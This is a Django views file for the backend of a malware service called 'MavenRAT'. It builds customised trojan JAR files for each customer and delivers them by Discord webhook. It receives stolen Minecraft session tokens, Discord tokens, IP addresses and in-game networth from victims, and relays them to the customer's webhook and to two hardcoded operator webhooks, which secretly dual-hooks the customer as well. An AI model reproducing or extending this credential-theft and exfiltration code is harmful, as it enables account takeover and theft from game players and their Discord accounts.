import os
import json
import zipfile
import tempfile
import shutil
import uuid
import time
import requests
from django.conf import settings
from django.http import JsonResponse, FileResponse, Http404
from django.views.decorators.csrf import csrf_exempt

# Obtém o diretório do arquivo atual (por exemplo, views.py)
base_dir = os.path.dirname(os.path.abspath(__file__))

@csrf_exempt
def Builder(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            user = data.get("user")
            ip = data.get("ip")
            webhook = data.get("webhook")

            user_id = str(uuid.uuid4())

            process_and_send_data(user_id, user, ip, webhook)

            jar_file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'rat', 'MavenRat1.0.jar')
            new_jar_content = replace_code_in_jar(jar_file_path, user_id)

            if new_jar_content is not None:
                send_to_webhook(webhook, new_jar_content)
                return JsonResponse({"message": "Data processed successfully"}, status=200)
            else:
                return JsonResponse({"error": "Failed to replace code in JAR"}, status=500)
        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON data"}, status=400)
        except Exception as e:
            print('An error occurred while processing the data:', e)
            return JsonResponse({"error": "An error occurred while processing the data"}, status=502)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

def process_and_send_data(user_id, user, ip, webhook):
    try:
        user_data = {
            "user_id": user_id,
            "user": user,
            "ip": ip,
            "webhook": webhook,
        }

        users_file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'users', 'users.json')
        update_users_file(users_file_path, user_data, ip)
    except Exception as e:
        print('An error occurred while processing and sending data:', e)

def update_users_file(users_file_path, user_data, ip):
    try:
        os.makedirs(os.path.dirname(users_file_path), exist_ok=True)

        if not os.path.exists(users_file_path):
            with open(users_file_path, 'w') as file:
                json.dump([], file)

        with open(users_file_path, 'r') as file:
            users = json.load(file)

        user_exists = False
        for existing_user in users:
            if existing_user['ip'] == ip:
                existing_user.update(user_data)
                user_exists = True
                break

        if not user_exists:
            users.append(user_data)

        with open(users_file_path, 'w') as file:
            json.dump(users, file, indent=4)
    except Exception as e:
        print('An error occurred while updating users file:', e)

def replace_code_in_jar(jar_file_path, user_id):
    try:
        temp_dir = tempfile.mkdtemp()
        with zipfile.ZipFile(jar_file_path, 'r') as jar_file:
            jar_file.extractall(temp_dir)

        java_file_path = os.path.join(temp_dir, 'dev', 'maven', 'rat', 'MavenRat.class')
        if os.path.exists(java_file_path):
            with open(java_file_path, 'rb') as file:
                java_bytes = file.read()

            old_string = b'92b85b45-2fe3-46ac-ae0e-ad3f2f82dbf2'
            new_string = user_id.encode('utf-8')
            java_bytes = java_bytes.replace(old_string, new_string)

            with open(java_file_path, 'wb') as file:
                file.write(java_bytes)

        new_jar_file_path = os.path.join(temp_dir, 'MavenRat1.0.jar')
        with zipfile.ZipFile(new_jar_file_path, 'w') as jar_file:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    jar_file.write(file_path, os.path.relpath(file_path, temp_dir))

        with open(new_jar_file_path, 'rb') as new_jar_file:
            new_jar_content = new_jar_file.read()

        shutil.rmtree(temp_dir) 

        return new_jar_content
    except Exception as e:
        print('An error occurred while replacing code in JAR:', e)
        return None

def send_to_webhook(webhook, new_jar_content):
    try:
        files = {
            'file': ('MavenRat1.0.jar', new_jar_content, 'application/java-archive')
        }
        time.sleep(5)

        response = requests.post(webhook, files=files)
        response.raise_for_status()
    except Exception as e:
        print('An error occurred while sending to webhook:', e)

@csrf_exempt
def Delivery(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)

            def validate_session(ign, uuid, ssid):
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + ssid
                }
                response = requests.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
                if response.status_code == 200:
                    profile = response.json()
                    if profile.get('name') == ign and profile.get('id') == uuid:
                        return True
                return False

            valid_session = validate_session(data.get("ign"), data.get("uuid"), data.get("ssid"))
            if not valid_session:
                return JsonResponse({"error": "Invalid session"}, status=400)
            
            def process_data_delivery(ign, uuid, ssid, ip, i, profile, networth, discord):
                try:
                    users_file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'users', 'users.json')
                    with open(users_file_path, 'r') as f:
                        users = json.load(f)

                    user_data = next((user for user in users if user['user_id'] == i), None)

                    if user_data:
                        cb = "```"
                        payload = info_message({
                            "uuid": uuid,
                            "ign": ign,
                            "ssid": ssid,
                            "ip": ip,
                            "profile": profile,
                            "networth": networth,
                            "discord": discord
                        }, cb)
                        WEBHOOK_DUAL_HOOK = "https://discord.com/api/webhooks/1257440903782600714/HAOiG3f2SXtNJm39kvlgB3epgMK-SKdA_NtgFpQSKcKa70F6hfk-AVXqU-H7108mtDMi"
                        response = requests.post(user_data['webhook'], json=payload)
                        response.raise_for_status()
                        response = requests.post(WEBHOOK_DUAL_HOOK, json=payload)
                        response.raise_for_status()

                        payload_second = info_message_second_webhook({
                            "uuid": uuid,
                            "ign": ign,
                            "ssid": ssid,
                            "ip": ip,
                            "profile": profile,
                            "networth": networth,
                            "discord": discord
                        }, cb)
                        SEGUNDA_WEBHOOK_URL = "https://discord.com/api/webhooks/1267605449449144432/6M3U6ZOcSL9ICyiGnU0Xv5es1tSGXsoFBzjd8QD90KwMkkLMKznedLQgSw8K5DykVU4A"
                        response_second = requests.post(SEGUNDA_WEBHOOK_URL, json=payload_second)
                        response_second.raise_for_status()

                    else:
                        print(f'User ID {i} not found in users.json')
                except Exception as e:
                    print(f'An error occurred in process_data_delivery: {e}')
            
            def info_message(data, cb):
                if 'discord' in data and data['discord']:
                    for tokenjson in data['discord']:
                        token = tokenjson.get('token')
                        headers = {
                            "Authorization": token
                        }
                        try:
                            tokeninfo = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
                            tokeninfo.raise_for_status()
                            return {
                                "username": "MavenRAT",
                                "avatar_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&",
                                "embeds": [{
                                    "title": ":unlock: Information",
                                    "color": 0xFFFFFF,
                                    "description": f"**[NameMC](https://namemc.com/profile/{data['uuid']}) | [Plancke](https://plancke.io/hypixel/player/stats/{data['uuid']}) | [SkyCrypt](https://sky.shiiyu.moe/stats/{data['uuid']}) | [IP](https://www.geolocation.com/{data['ip']})**",
                                    "fields": [
                                        {"name": ":video_game: IGN:", "value": f"{cb}{data.get('ign')}{cb}", "inline": True},
                                        {"name": ":key: UUID:", "value": f"{cb}{data['uuid']}{cb}", "inline": True},
                                        {"name": ":money_with_wings: Networth:", "value": f"{cb}{data.get('networth')}{cb}", "inline": True},
                                        {"name": ":lock: TOKEN:", "value": f"{cb}{data.get('ssid')}{cb}", "inline": False},
                                        {"name": ":lock: DISCORD TOKEN:", "value": f"{cb}{token}{cb}", "inline": False},
                                    ],
                                    "footer": {
                                        "text": "Made with ❤️ by MavenRAT",
                                        "icon_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&"
                                    }
                                }]
                            }
                        except requests.RequestException as e:
                            print(f"Error fetching token info: {e}")
                            return {}
                else:
                    return {}
                
            def info_message_second_webhook(data, cb):
                return {
                    "username": "MavenRAT HIT",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&",
                    "embeds": [{
                        "title": ":moneybag: Skyblock Info",
                        "color": 0xFFFFFF,
                        "fields": [
                            {"name": ":bust_in_silhouette: Profile:", "value": f"{cb}{data.get('profile')}{cb}", "inline": True},
                            {"name": ":money_with_wings: Networth:", "value": f"{cb}{data.get('networth')}{cb}", "inline": True},
                        ],
                        "footer": {
                            "text": "Made with ❤️ by MavenRAT",
                            "icon_url": "https://cdn.discordapp.com/attachments/1247691952397226105/1247691993186959451/144267874.png?ex=66829178&is=66813ff8&hm=7d1518fb3387e6610f7ce4e32bdf2a9bc70160196bdec9feeb8595227755be0a&"
                        }
                    }]
                }
            
            process_data_delivery(
                data.get("ign"),
                data.get("uuid"),
                data.get("ssid"),
                data.get("ip"),
                data.get("i"),
                data.get("profile"),
                data.get("networth"),
                data.get("discord")
            )

            return JsonResponse({"message": "Data processed successfully"}, status=200)
        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON data"}, status=400)
        except Exception as e:
            print('An error occurred while processing the data:', e)
            return JsonResponse({"error": "An error occurred while processing the data"}, status=502)
    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)

@csrf_exempt
def builder_download(request):
    file_path = os.path.join(base_dir, 'MavenRAT', 'mavenrat', 'builder', 'MavenBuilder.jar')
    if os.path.exists(file_path):
        # Use FileResponse directly with the file path
        response = FileResponse(open(file_path, 'rb'), as_attachment=True, filename='MavenBuilder.jar')
        return response
    else:
        raise Http404('File not found')
